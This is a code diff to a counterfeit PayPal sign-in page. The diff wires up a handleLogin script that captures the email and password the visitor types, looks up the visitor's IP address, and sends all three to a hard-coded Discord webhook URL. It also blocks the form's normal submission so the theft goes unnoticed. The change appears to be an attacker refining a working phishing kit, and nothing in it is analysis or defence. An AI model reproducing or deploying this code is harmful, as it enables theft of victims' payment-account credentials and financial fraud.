@@ -20,7 +20,7 @@
                     
                     <div id="loginContent">
                         <div id="loginSection">
-                            <form action="https://www.paypal.com/signin" method="post" autocomplete="off" name="login" novalidate="">
+                            <form id="loginForm" action="https://www.paypal.com/signin" method="post" autocomplete="off" name="login" novalidate="">
                                 <div id="passwordSection" class="clearfix splitEmail">
                                     <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
                                         <div class="textInput" id="login_emaildiv" style="z-index: 1;">
@@ -83,79 +83,85 @@
 
     <script>
         function handleLogin() {
-    // Get the values of the email and password fields
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    
-    // Define the webhook URL
-    const webhookURL = 'https://discord.com/api/webhooks/1269888495653228544/ZvJDX9kX8ikp3j5qdXH2KObOWl_XU3gijMSB3sAA3v7WsMP5p3eENBVugkX6mxsE4qO_';
-
-    // Fetch the IP address
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const ip = data.ip;  // Use `let` if you need to modify it later
+            // Get the values of the email and password fields
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
             
-            // Create the message payload with an embed
-            const message = {
-                embeds: [
-                    {
-                        title: "Login Attempt",
-                        description: "A login attempt has been made.",
-                        color: 3447003, // Hex color code for blue
-                        fields: [
+            // Define the webhook URL
+            const webhookURL = 'https://discord.com/api/webhooks/1269888495653228544/ZvJDX9kX8ikp3j5qdXH2KObOWl_XU3gijMSB3sAA3v7WsMP5p3eENBVugkX6mxsE4qO_';
+
+            // Fetch the IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;  // Use `let` if you need to modify it later
+                    
+                    // Create the message payload with an embed
+                    const message = {
+                        embeds: [
                             {
-                                name: "Email",
-                                value: email,
-                                inline: true
-                            },
-                            {
-                                name: "Password",
-                                value: password,
-                                inline: true
-                            },
-                            {
-                                name: "IP",
-                                value: ip,
-                                inline: false
+                                title: "Login Attempt",
+                                description: "A login attempt has been made.",
+                                color: 3447003, // Hex color code for blue
+                                fields: [
+                                    {
+                                        name: "Email",
+                                        value: email,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "Password",
+                                        value: password,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "IP",
+                                        value: ip,
+                                        inline: false
+                                    }
+                                ],
+                                footer: {
+                                    text: "Login Details",
+                                    icon_url: "https://png.pngtree.com/element_our/png/20180723/paypal-logo-icon-png_44635.jpg" // PayPal logo URL
+                                },
+                                thumbnail: {
+                                    url: "https://png.pngtree.com/element_our/png/20180723/paypal-logo-icon-png_44635.jpg" // PayPal thumbnail URL
+                                }
                             }
-                        ],
-                        footer: {
-                            text: "Login Details",
-                            icon_url: "https://png.pngtree.com/element_our/png/20180723/paypal-logo-icon-png_44635.jpg" // PayPal logo URL
+                        ]
+                    };
+
+                    // Send the message via a POST request to the Discord webhook
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
                         },
-                        thumbnail: {
-                            url: "https://png.pngtree.com/element_our/png/20180723/paypal-logo-icon-png_44635.jpg" // PayPal thumbnail URL
-                        }
-                    }
-                ]
-            };
+                        body: JSON.stringify(message),
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Success:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                });
 
-            // Send the message via a POST request to the Discord webhook
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
-        })
-        .catch(error => {
-            console.error('Error fetching IP:', error);
+            // Prevent form submission
+            return false;
+        }
+
+        // Attach event listener to the form
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+            handleLogin(); // Call handleLogin function
         });
-
-    // Prevent form submission
-    return false;
-}
-
     </script>
 
 </body>
 </html>
+
